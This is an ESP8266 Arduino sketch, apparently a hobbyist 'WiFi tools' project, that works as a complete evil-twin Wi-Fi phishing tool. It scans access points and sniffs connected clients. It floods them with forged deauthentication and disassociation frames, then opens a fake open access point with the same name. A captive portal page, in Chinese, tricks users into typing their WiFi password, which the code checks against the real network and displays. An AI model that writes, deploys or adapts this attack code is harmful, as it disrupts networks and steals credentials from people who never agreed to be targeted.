   
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <Wire.h>  // Only needed for Arduino 1.6.5 and earlier
#include "SSD1306.h" // alias for `#include "SSD1306Wire.h"`

extern "C" {
  #include "user_interface.h"
}

#define MODE_SCAN_APS 0
#define MODE_SCAN_STA 1
#define MODE_DEAUTHER 2
#define MODE_OTHER_SS 3
int varMode = MODE_OTHER_SS;
uint32_t snifferStartTime = 0;
uint32_t deauthStartTime = 0;
uint32_t currentTime = 0;

/*=====================================================================*/
SSD1306Wire display(0x3c, D1, D2);
String displayTitle = "WIFI Tools by jky88:";
String displayAP = "";
String displayPWD = "";
String displayMSG = "";

/*=====================================================================*/
#define maxAPs 5
#define maxSTAs 10
uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
uint8_t iapMac[maxAPs][6];
uint8_t istMac[maxAPs][maxSTAs][6];
int iapc[maxAPs] = {0, 0, 0, 0, 0};
int iChannels[maxAPs];
char capNames[maxAPs][33];
int iap = 0;
/*---------------------------------------*/
void apScan() {
  int x = 0;
  int results = WiFi.scanNetworks(false, true);
  for (int i = 0; i < results; i++) {
    Serial.println(">AP: " + WiFi.SSID(i));
    for (int j = 0; j < 6; j++) iapMac[x][j] = WiFi.BSSID(i)[j];
    iChannels[x] = WiFi.channel(i);
    String _ssid = WiFi.SSID(i);
    _ssid.toCharArray(capNames[x], 33);
    if (isalnum(capNames[x][0])) x++;
    if (x >= maxAPs) return;
  }
}
/*---------------------------------------*/
bool macCmp(uint8_t* fMac, uint8_t* tMac) {
  for (int i = 0; i < 6; i++) {
    if (fMac[i] != tMac[i]) return false;
  }
  return true;
}
/*---------------------------------------*/
void sniffer(uint8_t* buf, uint16_t len) {
  if (varMode != MODE_SCAN_STA) return;
  if ((buf[12] == 0xc0) || (buf[12] == 0xa0)) return;
  if ((buf[12] == 0x80) || (buf[12] == 0x40) || (buf[12] == 0x50)) return;
  if (macCmp(broadcast, buf + 16) || macCmp(broadcast, buf + 22)) return;
  for (int i = 0; i < maxAPs; i++) {
    if (macCmp(iapMac[i], buf + 16)) {
      if (iapc[i] >= maxSTAs) return;
      for (int x = 0; x < iapc[i]; x++) {
        if (macCmp(istMac[i][x], buf + 22)) return;
      }
      for (int x = 0; x < 6; x++) {
        istMac[i][iapc[i]][x] = buf[22 + x];
      }
      Serial.print(">>>ST: " + String(capNames[i]) + " >>> ");
      for (int j = 0; j < 6; j++) Serial.print(String(istMac[i][iapc[i]][j]) + ".");
      Serial.println();
      iapc[i]++;
    }
    if (macCmp(iapMac[i], buf + 22)) {
      if (iapc[i] >= maxSTAs) return;
      for (int x = 0; x < iapc[i]; x++) {
        if (macCmp(istMac[i][x], buf + 16)) return;
      }
      for (int x = 0; x < 6; x++) {
        istMac[i][iapc[i]][x] = buf[16 + x];
      }
      Serial.print(">>>ST: " + String(capNames[i]) + " >>> ");
      for (int j = 0; j < 6; j++) Serial.print(String(istMac[i][iapc[i]][j]) + ".");
      Serial.println();
      iapc[i]++;
    }
  }
}

/*=====================================================================*/
DNSServer dnsServer;
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
ESP8266WebServer webServer(80);
/*---------------------------------------------------------------------*/
void startOpenAP(int iNum) {
  wifi_promiscuous_enable(false);
  WiFi.persistent(false);
  WiFi.disconnect(true);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP((const char*)capNames[iNum], (const char*)"", iChannels[iNum]);
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.on("/", handleRoot);
  webServer.on("/postform/", handleForm);
  webServer.onNotFound(handleRoot);
  webServer.begin();
}

/*=====================================================================*/
uint8_t deauthPacket[26] = {
  /*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
  /*  2 - 3  */ 0x00, 0x00, //duration (SDK takes care of that)
  /*  4 - 9  */ 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,//reciever (target)
  /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //source (ap)
  /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //BSSID (ap)
  /* 22 - 23 */ 0x00, 0x00, //fragment & squence number
  /* 24 - 25 */ 0x01, 0x00 //reason code (1 = unspecified reason)
};
/*---------------------------------------------------------------------*/
void sendDeauth(int iNum) {
  int packetSize = sizeof(deauthPacket);
  for (int i = 0; i < maxSTAs; i++) {
    if (i >= iapc[iNum]) return;
    //-------------------------------------------------------------------
    for (int x = 0; x < 6; x++) {
      deauthPacket[4 + x] = istMac[iNum][i][x];
      deauthPacket[10 + x] = iapMac[iNum][x];
      deauthPacket[16 + x] = iapMac[iNum][x];
    }
    deauthPacket[0] = 0xc0;
    if (wifi_send_pkt_freedom(deauthPacket, packetSize, 0) == -1) Serial.print("-");
    deauthPacket[0] = 0xa0;
    if (wifi_send_pkt_freedom(deauthPacket, packetSize, 0) == -1) Serial.print("-");
    //-------------------------------------------------------------------
    for (int x = 0; x < 6; x++) {
      deauthPacket[4 + x] = iapMac[iNum][x];
      deauthPacket[10 + x] = istMac[iNum][i][x];
      deauthPacket[16 + x] = istMac[iNum][i][x];
    }
    deauthPacket[0] = 0xc0;
    if (wifi_send_pkt_freedom(deauthPacket, packetSize, 0) == -1) Serial.print("-");
    deauthPacket[0] = 0xa0;
    if (wifi_send_pkt_freedom(deauthPacket, packetSize, 0) == -1) Serial.print("-");
  }
  delay(2); //less packets are beeing dropped
}

/*=====================================================================*/
const String postForms = "<html><head><title>Router</title></head><body>\
    <div align=\"center\" style=\"padding-top:20%\">\
    <p><B>&#x4E3A;&#x4E86;&#x4FDD;&#x969C;&#x60A8;&#x7684;\
    &#x7F51;&#x7EDC;&#x5B89;&#x5168;&#xFF0C;&#x8BF7;&#x91CD;\
    &#x65B0;&#x786E;&#x8BA4;WIFI&#x5BC6;&#x7801;!</B></p><br/>\
    <form method=\"post\" action=\"/postform/\"><label>WiFi&#x5BC6;&#x7801;:</label>\
    <input type=\"text\" name=\"pwd\" placeholder=&#x8BF7;&#x8F93;&#x5165;&#x5BC6;&#x7801;>\
    <br/><br/><input type=\"submit\" value=&#x786E;&#x5B9A; style=\"width:250px;height:30px\">\
    <br/><br/></form></div></body></html>";
/*---------------------------------------------------------------------*/
void handleRoot() {
  webServer.send(200, "text/html", postForms);
}
/*---------------------------------------------------------------------*/
void handleForm() {
  if (webServer.method() != HTTP_POST) {
    webServer.send(405, "text/plain", "Method Not Allowed");
  } else {
    if (webServer.hasArg("pwd")) {
      webServer.send(200, "text/json", "true" );
      WiFi.mode(WIFI_STA);
      WiFi.begin((const char*)capNames[iap], (const char*)webServer.arg("pwd").c_str());
      displayAP = capNames[iap];
      displayPWD = webServer.arg("pwd");
      int count = 0;
      while (WiFi.status() != WL_CONNECTED && count++ < 10) {
        delay(1000);
      }
      if (count >= 10) {
        WiFi.mode(WIFI_AP);
        WiFi.softAP((const char*)capNames[iap], (const char*)"", iChannels[iap]);
        displayMSG = "pwd is not ok!!!";
      } else {
        Serial.println("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");
        Serial.println(capNames[iap] + String("==>>") + webServer.arg("pwd"));
        displayMSG = "pwd is ok!!!";
        varMode = MODE_OTHER_SS;
      }
    } else webServer.send(200, "text/json", "false");
  }
}

/*=====================================================================*/
/*=====================================================================*/
/*=====================================================================*/
void setup() {
  Serial.begin(115200);
  display.init();
  display.flipScreenVertically();
  display.setFont(ArialMT_Plain_10);
  display.setTextAlignment(TEXT_ALIGN_LEFT);

  WiFi.mode(WIFI_OFF);
  wifi_set_opmode(STATION_MODE);
  wifi_set_promiscuous_rx_cb([](uint8_t* buf, uint16_t len) {
    sniffer(buf, len);
  });
  varMode = MODE_SCAN_APS;
  Serial.println("@@@setup@@@setup@@@setup@@@");
}

/*=====================================================================*/
/*=====================================================================*/
/*=====================================================================*/
void loop() {
  currentTime = millis();
  switch (varMode) {
    //==============================================================
    case MODE_SCAN_APS:
      apScan();
      wifi_promiscuous_enable(false);
      WiFi.persistent(false);
      WiFi.disconnect(true);
      wifi_set_channel(iChannels[iap]);
      wifi_set_opmode(STATION_MODE);
      wifi_promiscuous_enable(true);
      snifferStartTime = millis();
      varMode = MODE_SCAN_STA;
      Serial.println("@@@MODE_SCAN_APS is Over!!!!!!");
      break;
    //==============================================================
    case MODE_SCAN_STA:
      if (currentTime > snifferStartTime + 15000) {
        wifi_promiscuous_enable(false);
        if (iap++ >= maxAPs) {
          iap = 0;
          startOpenAP(iap);
          deauthStartTime = millis();
          varMode = MODE_DEAUTHER;
          Serial.println("@@@MODE_SCAN_STA is Over!!!!!!");
          break;
        }
        wifi_set_channel(iChannels[iap]);
        wifi_promiscuous_enable(true);
        snifferStartTime = currentTime;
      }
      break;
    //==============================================================
    case MODE_DEAUTHER:
      webServer.handleClient();
      dnsServer.processNextRequest();
      if (iapc[iap] == 0) iap++;
      if (currentTime > deauthStartTime + 60000) {
        if (iap++ >= maxAPs) {
          iap = 0;
          varMode = MODE_SCAN_STA;
          snifferStartTime = millis();
          Serial.println("@@@MODE_DEAUTHER is Over!!!!!!");
          break;
        }
        startOpenAP(iap);
        deauthStartTime = millis();
      } else {
        sendDeauth(iap);
      }
      break;
    //==============================================================
    default:
      Serial.println("varMode = " + varMode);
      break;
  }
  display.clear();
  display.drawString(10, 2, String(millis()));
  display.drawString(10, 14, displayTitle);
  display.drawString(10, 26, displayAP);
  display.drawString(10, 38, displayPWD);
  display.drawString(10, 50, displayMSG);
  display.display();
  delay(30);
} 
